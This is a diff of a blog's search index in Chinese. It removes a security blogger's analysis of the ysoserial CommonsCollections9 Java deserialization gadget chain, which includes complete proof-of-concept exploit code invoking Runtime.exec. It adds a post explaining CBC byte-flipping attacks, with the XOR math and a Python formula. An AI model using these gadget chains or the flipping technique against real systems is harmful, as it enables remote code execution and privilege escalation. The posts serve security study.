Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map innerMap1 = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map innerMap2 = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">        Map lazymap1 = LazyMap.decorate(innerMap1,chainedTransformer);</span><br><span class="line">        lazymap1.put(<span class="string">"yy"</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Map lazymap2 = LazyMap.decorate(innerMap2,chainedTransformer);</span><br><span class="line">        lazymap2.put(<span class="string">"zZ"</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Hashtable hashtable = <span class="keyword">new</span> Hashtable();</span><br><span class="line">        hashtable.put(lazymap1,<span class="number">1</span>);</span><br><span class="line">        hashtable.put(lazymap2,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        lazymap2.remove(<span class="string">"yy"</span>);</span><br><span class="line"></span><br><span class="line">         ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">         ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">         out.writeObject(hashtable);</span><br><span class="line">         out.flush();</span><br><span class="line">         out.close();</span><br><span class="line"></span><br><span class="line">         <span class="keyword">byte</span>[] bytes = baos.toByteArray();</span><br><span class="line"></span><br><span class="line">         ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(bytes);</span><br><span class="line">         ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">         in.readObject();</span><br><span class="line">         in.close();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>结果如下:</p>
-<p><img src="7.png" alt=""></p>
 <h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
 <li><a href="http://blog.0kami.cn/2019/10/31/study-java-deserialized-commonscollections3-others/" target="_blank" rel="noopener">Java反序列化利用链挖掘之CommonsCollections5,6,7,9,10</a></li>
-<li><a href="https://www.cnblogs.com/tr1ple/p/12427015.html" target="_blank" rel="noopener">java反序列化-ysoserial-调试分析总结篇(7)</a></li>
+<li><a href="https://github.com/frohoff/ysoserial/pull/125/commits/4edf02ba7765488cac124c92e04c6aae40da3e5d" target="_blank" rel="noopener">CommonsCollections9payload</a></li>
 </ul>
 ]]></content>
       <categories>
@@ -915,37 +894,58 @@
       </categories>
   </entry>
   <entry>
-    <title>ysoserial分析之CommonsCollections9</title>
-    <url>/2020/04/28/ysoserial-analyze-9/</url>
-    <content><![CDATA[<p>这篇文章要分析的是CommonsCollections9，根据<a href="https://github.com/wh1t3p1g" target="_blank" rel="noopener">wh1t3p1g</a>师傅的收集，找到了<a href="https://github.com/meizjm3i" target="_blank" rel="noopener">梅子酒</a>师傅提交的CommonsCollections9。它利用了3.2.1版本中的<font color=#00800><code>DefaultedMap</code></font></p>
+    <title>CBC字节翻转攻击</title>
+    <url>/2020/05/08/cbc-reverse/</url>
+    <content><![CDATA[<p>在CBC模式中，每个明文块先与前一个密文块进行异或后，再进行加密。在这种方法中，每个密文块都依赖于它前面的所有明文块。同时为了保证保证即使对相同明文多次加密，也可以得到不同的密文，在第一个块中使用<font color=#008000>IV(初始化向量)</font>。当获取到一组明文与其对应的IV，密文时，即可发起CBC字节翻转攻击。</p>
 <a id="more"></a>
 
-<p>前面已经分析了:<br><a href="https://ananaskr.github.io/2020/04/20/ysoserial-analyze/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections1</a><br><a href="https://ananaskr.github.io/2020/04/24/ysoserial-analyze-2/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections2</a><br><a href="https://ananaskr.github.io/2020/04/23/ysoserial-analyze-3/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections3</a><br><a href="https://ananaskr.github.io/2020/04/26/ysoserial-analyze-4/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections4</a><br><a href="https://ananaskr.github.io/2020/04/26/ysoserial-analyze-5/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections5</a><br><a href="https://ananaskr.github.io/2020/04/27/ysoserial-analyze-6/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections6</a><br><a href="https://ananaskr.github.io/2020/04/27/ysoserial-analyze-7/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections7</a><br><a href="https://ananaskr.github.io/2020/04/28/ysoserial-analyze-8/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections8</a> </p>
-<p>梅子酒师傅提交的CommonsCollections9利用的是commonscollections:3.2版本新增加的<code>DefaultedMap</code>类来替代LazyMap。因为这两个类中的get函数具有类似的作用。作者表明只能在JDK8u76成功，实际上，在jdk1.8.0_111也能成功？</p>
-<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ul>
-<li>commonscollections:3.2.1</li>
-<li>未配置security-manager</li>
-</ul>
-<p>先来看看整个的利用链</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BadAttributeValueExpException.readObject()</span><br><span class="line">  -&gt;TiedMapEntry.toString()</span><br><span class="line">    -&gt;DefaultedMap.get()</span><br><span class="line">      -&gt;ChainedTransformer.transform()</span><br><span class="line">        -&gt;ConstantTransformer.transform()</span><br><span class="line">        -&gt;InvokerTransformer.transform()</span><br></pre></td></tr></table></figure>
-
-<h2 id="利用链分析及payload构造"><a href="#利用链分析及payload构造" class="headerlink" title="利用链分析及payload构造"></a>利用链分析及payload构造</h2><p>从payload的整个利用链可以看出，整个链的构造和CommonsCollections5很相似，都是利用了BadAttributeValueExpException作为最外层。不同的只有中间的<code>DefaultedMap</code>类，那么就从分析这个类开始。定位到这个类的get函数</p>
+<h1 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h1><p><strong>加密过程如下所示</strong>:</p>
 <p><img src="1.png" alt=""></p>
-<p>在函数里会调用<code>((Transformer)this.value).transform(key)</code>，当this.value为构造的ChainedTransformer对象时，就可以RCE了。而这个value在DefaultedMap实例化时传入的参数。如下代码</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">Map defaultedMap = DefaultedMap.decorate(map,transformer);</span><br></pre></td></tr></table></figure>
-
-<p>然后其余的与CommonsCollections5一致，完整的demo如下:</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.DefaultedMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;)</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer transformer  = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map defaultedMap = DefaultedMap.decorate(map,transformer);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(defaultedMap,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        BadAttributeValueExpException val = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">        Field field = val.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(val,tiedMapEntry);</span><br><span class="line">        </span><br><span class="line">         ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">         ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">         out.writeObject(val);</span><br><span class="line">         out.flush();</span><br><span class="line">         out.close();</span><br><span class="line"></span><br><span class="line">         <span class="keyword">byte</span>[] bytes = baos.toByteArray();</span><br><span class="line"></span><br><span class="line">         ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(bytes);</span><br><span class="line">         ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">         in.readObject();</span><br><span class="line">         in.close();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>运行的结果如下所示:</p>
+<p>文字版的加密过程：</p>
+<ol>
+<li>首先将明文分组(常见于以16字节一组)，位数不足进行填充。</li>
+<li>生成一个随机的初始化向量(IV)和一个密钥。</li>
+<li>将IV和第一组明文异或。</li>
+<li>用密钥对异或的结果使用密钥key进行加密，得到密文C1。</li>
+<li>使用C1与第二组明文进行异或，然后使用key加密，得到密文C2。</li>
+<li>重复4-5,直到最后一组明文。</li>
+<li>将IV和加密后的密文拼接在一起，得到最终的密文。</li>
+</ol>
+<h1 id="解密过程"><a href="#解密过程" class="headerlink" title="解密过程"></a>解密过程</h1><p><strong>解密过程如下所示</strong>:</p>
 <p><img src="2.png" alt=""></p>
+<p>文字版的解密过程：</p>
+<ol>
+<li>从密文中提取出IV，然后将密文分组。</li>
+<li>使用密钥key对第一组密文进行解密，然后和IV进行异或得到第一组明文。</li>
+<li>使用key对第二组密文进行解密，然后和第一组密文进行异或得到第二组明文。</li>
+<li>重复3，直到最后一组密文。</li>
+</ol>
+<h1 id="CBC翻转攻击"><a href="#CBC翻转攻击" class="headerlink" title="CBC翻转攻击"></a>CBC翻转攻击</h1><p><strong>CBC翻转攻击原理</strong>:</p>
+<p>而CBC翻转攻击与解密过程有关。直观来看，IV会影响到第一组明文的值，而每一组明文的值都会被前一组密文所影响。若第一块密文中的某个字节被改变，则解密出来的第二组明文对应的字节也会被改变。可以从下图看出这整个过程</p>
+<p><img src="3.png" alt=""></p>
+<p>可以得知，某组密文的改变会影响到其对应的明文块的<font color=#008000>完全改变</font>以及下一个明文块中<font color=#008000>对应位置的改变</font>。</p>
+<p>此攻击造成的影响:</p>
+<ol>
+<li>绕过过滤器</li>
+<li>改变用户权限提升至管理员</li>
+<li>…</li>
+</ol>
+<p><strong>CBC翻转攻击过程</strong></p>
+<p>具体的如何改变明文呢？假设要改变第二组明文的值，那么就需要改变对应的第一组密文的值。这里就要利用到异或的原理，若<code>A = B XOR C</code>，那么<font color=#008000><code>A XOR B XOR C = 0</code></font>。所以，<code>0 XOR ANY = ANY</code>。假设ANY为最终我们想要改变的明文字节值。 有如下的计算方式:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">P[1] &#x3D; decrept(C[1]) XOR IV</span><br><span class="line">P[2] &#x3D; decrept(C[2]) XOR C[1]</span><br><span class="line"></span><br><span class="line">ANY &#x3D; P[2] XOR decrept(C[2]) XOR C[1] XOR ANY</span><br><span class="line"></span><br><span class="line">ANY &#x3D; decrept(C[2]) XOR (P[2] XOR C[1] XOR ANY)</span><br><span class="line">C&#39;[1] &#x3D; P[2] XOR C[1] XOR ANY</span><br></pre></td></tr></table></figure>
+
+<p>由上述可知，改变的密文字节值的计算方式为<font color=#008000><code>P[2] XOR C[1] XOR ANY</code></font>。python中使用如下方式进行计算</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">chr(ord(C[<span class="number">1</span>])^ord(P[<span class="number">2</span>])^ord(ANY))</span><br></pre></td></tr></table></figure>
+
+<p>对应的明文确实如期地改变了，但由于密文C[1]的变化，使得明文P[1]的结果也面目全非。而明文P[1]的结果与IV相关，IV为我们可控。因此按照同样的方法改变IV的值，最终就得到了更改后的密文和IV。</p>
+<p>对此感兴趣的同学可以<a href="https://p0sec.net/index.php/archives/99/" target="_blank" rel="noopener">p0’s</a>师傅出得一道题来看看。</p>
 <h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
-<li><a href="http://blog.0kami.cn/2019/10/31/study-java-deserialized-commonscollections3-others/" target="_blank" rel="noopener">Java反序列化利用链挖掘之CommonsCollections5,6,7,9,10</a></li>
-<li><a href="https://github.com/frohoff/ysoserial/pull/125/commits/4edf02ba7765488cac124c92e04c6aae40da3e5d" target="_blank" rel="noopener">CommonsCollections9payload</a></li>
+<li><a href="https://maplege.github.io/2018/11/19/CBC-reverse/" target="_blank" rel="noopener">CBC字节反转攻击原理</a></li>
+<li><a href="https://p0sec.net/index.php/archives/99/" target="_blank" rel="noopener">CBC字节翻转攻击</a></li>
 </ul>
 ]]></content>
       <categories>
-        <category>JAVA安全</category>
+        <category>密码攻击</category>
       </categories>
   </entry>
 </search>
